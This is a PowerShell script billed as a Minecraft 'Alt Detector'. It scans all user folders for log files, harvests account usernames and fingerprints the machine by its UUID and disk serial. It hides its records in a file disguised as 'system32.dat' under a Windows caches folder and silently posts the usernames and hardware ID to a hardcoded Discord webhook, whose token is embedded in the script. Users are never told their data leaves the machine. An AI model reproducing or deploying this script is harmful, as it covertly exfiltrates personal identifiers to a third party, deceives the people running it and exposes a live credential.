$webhookUrl = "https://discord.com/api/webhooks/1485035447221616791/OIIiXNb7gCbY0BbMmJ6w1WkrWIwiSXwX8n19rqkKFyYnHB218j8WT9Cpd7eC1qMomEDF"
$startPath = "C:\Users"
$hwidFolder = "$env:APPDATA\Microsoft\Windows\Caches"
$hwidFile = "$hwidFolder\system32.dat"
$hwidDatabase = "$hwidFolder\hwid_alts.json"

if (-not (Test-Path $hwidFolder)) { New-Item -ItemType Directory -Path $hwidFolder -Force | Out-Null }

function Get-HWID {
    try {
        $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
        $uuid = $computerInfo.UUID
        $drive = Get-WmiObject Win32_DiskDrive | Where-Object { $_.Index -eq 0 }
        $driveSerial = $drive.SerialNumber
        $hwid = "$uuid-$driveSerial"
        $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid)))
        return $hash -replace '-', ''
    }
    catch { return "UNKNOWN" }
}

$hwid = Get-HWID

$storedAlts = @{}
if (Test-Path $hwidFile) {
    try {
        $encrypted = Get-Content $hwidFile -Raw
        $bytes = [System.Convert]::FromBase64String($encrypted)
        $decrypted = [System.Text.Encoding]::UTF8.GetString($bytes)
        $storedAlts = $decrypted | ConvertFrom-Json
    } catch { $storedAlts = @{} }
}

$hwidAltDatabase = @{}
if (Test-Path $hwidDatabase) {
    try {
        $databaseContent = Get-Content $hwidDatabase -Raw
        $hwidAltDatabase = $databaseContent | ConvertFrom-Json
        if ($hwidAltDatabase -eq $null) { $hwidAltDatabase = @{} }
    } catch { $hwidAltDatabase = @{} }
}

if (-not (Test-Path $startPath)) { exit }

Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan

$gzFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.gz" -File -Force -ErrorAction SilentlyContinue
$logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force -ErrorAction SilentlyContinue
$allFiles = @($gzFiles) + @($logFiles)

$allFoundAlts = @()

foreach ($file in $allFiles) {
    try {
        $content = $null
        $isGz = $file.Extension -eq ".gz"
        
        if ($isGz) {
            $tempFileName = "$($file.BaseName)_temp_$([guid]::NewGuid().ToString('N')).txt"
            $tempOutput = Join-Path $file.DirectoryName $tempFileName
            
            $inputStream = [System.IO.File]::OpenRead($file.FullName)
            $outputStream = [System.IO.File]::Create($tempOutput)
            $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
            
            $gzipStream.CopyTo($outputStream)
            $gzipStream.Close(); $outputStream.Close(); $inputStream.Close()
            
            $content = Get-Content $tempOutput -Raw -ErrorAction SilentlyContinue
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        }
        
        $pattern = "Setting user:\s*(\S+)"
        if ($content -and $content -match $pattern) {
            $username = $Matches[1]
            $allFoundAlts += $username
        }
    }
    catch { continue }
}

$uniqueFoundAlts = $allFoundAlts | Select-Object -Unique

if ($uniqueFoundAlts.Count -gt 0) {
    $storedAlts = @{}
    foreach ($alt in $uniqueFoundAlts) { $storedAlts[$alt] = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss") }
    $json = $storedAlts | ConvertTo-Json
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $encrypted = [System.Convert]::ToBase64String($bytes)
    Set-Content -Path $hwidFile -Value $encrypted -Force
    
    if ($hwidAltDatabase.$hwid -eq $null) {
        $hwidAltDatabase | Add-Member -MemberType NoteProperty -Name $hwid -Value (@{})
    }
    
    foreach ($alt in $uniqueFoundAlts) {
        if ($hwidAltDatabase.$hwid.$alt -eq $null) {
            $hwidAltDatabase.$hwid | Add-Member -MemberType NoteProperty -Name $alt -Value (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        }
    }
    
    $hwidAltDatabase | ConvertTo-Json -Depth 10 | Set-Content -Path $hwidDatabase -Force
}

$description = ""

if ($uniqueFoundAlts.Count -gt 0) {
    Write-Host "`nAlts found on this system:" -ForegroundColor Cyan
    $counter = 1
    $description += "**ALT ACCOUNTS DETECTED:**`n`n"
    foreach ($username in $uniqueFoundAlts) {
        Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
        $description += "$counter. $username`n"
        $counter++
    }
    $title = "ALT ACCOUNTS DETECTED"
    $color = 0x9B59B6
} else {
    Write-Host "No alt accounts found." -ForegroundColor Yellow
    $description += "**NO ALT ACCOUNTS FOUND**`n`nNo Minecraft alt accounts were detected on this system."
    $title = "ALT ACCOUNTS CHECK"
    $color = 0x3498DB
}

$description += "`n`n**HWID:** $hwid"

$description += "`n`n**ALTS LINKED TO THIS HWID:**`n"
if ($hwidAltDatabase.$hwid -ne $null) {
    $altCounter = 1
    $altNames = @()
    foreach ($prop in $hwidAltDatabase.$hwid.PSObject.Properties.Name) {
        if ($prop -ne "Keys" -and $prop -ne "Values" -and $prop -ne "Count" -and $prop -ne "IsReadOnly" -and $prop -ne "IsFixedSize" -and $prop -ne "IsSynchronized" -and $prop -ne "SyncRoot") {
            $altNames += $prop
        }
    }
    $altNames = $altNames | Sort-Object
    foreach ($alt in $altNames) {
        $firstSeen = $hwidAltDatabase.$hwid.$alt
        $description += "$altCounter. $alt (First detected: $firstSeen)`n"
        Write-Host ("  {0}. {1} (First detected: {2})" -f $altCounter, $alt, $firstSeen) -ForegroundColor Green
        $altCounter++
    }
    if ($altCounter -eq 1) {
        $description += "No alts have been linked to this HWID yet.`n"
        Write-Host "  No alts have been linked to this HWID yet." -ForegroundColor Yellow
    }
} else {
    $description += "No alts have been linked to this HWID yet.`n"
    Write-Host "  No alts have been linked to this HWID yet." -ForegroundColor Yellow
}

$embed = @{
    title = $title
    color = $color
    description = $description
    timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
}

$payload = @{ embeds = @($embed); username = "Alt Detector" } | ConvertTo-Json -Depth 3
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "ALT DETECTION COMPLETE" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
